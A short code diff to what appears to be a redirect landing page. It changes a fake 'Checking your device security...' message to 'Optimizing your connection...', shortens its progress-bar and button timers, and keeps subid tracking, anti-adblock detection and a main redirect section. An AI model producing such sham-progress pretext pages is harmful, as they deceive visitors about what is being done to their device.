@@ -74,7 +74,7 @@ button:hover{
 <div class="container">
   <div class="box">
 
-    <h2 id="text">Checking your device security...
+    <h2 id="text">Optimizing your connection...
 </h2>
 
     <div class="progress-bar">
@@ -91,7 +91,7 @@ button:hover{
 <script>
 
 // ✅ GET SUBID
-let urlParams = new URLSearchParams(window.location.search);
+
 
 let subid = new URLSearchParams(window.location.search).get("subid") || "default";
 
@@ -120,7 +120,7 @@ let interval = setInterval(() => {
 
   bar.style.width = progress + "%";
 
-}, 500);
+}, 400);
 
 
 // ✅ ANTI-ADBLOCK DETECTION
@@ -145,7 +145,7 @@ btn.disabled = true;
 
 setTimeout(() => {
   btn.disabled = false;
-}, 2000);
+}, 1200);
 
 
 // ✅ MAIN REDIRECT
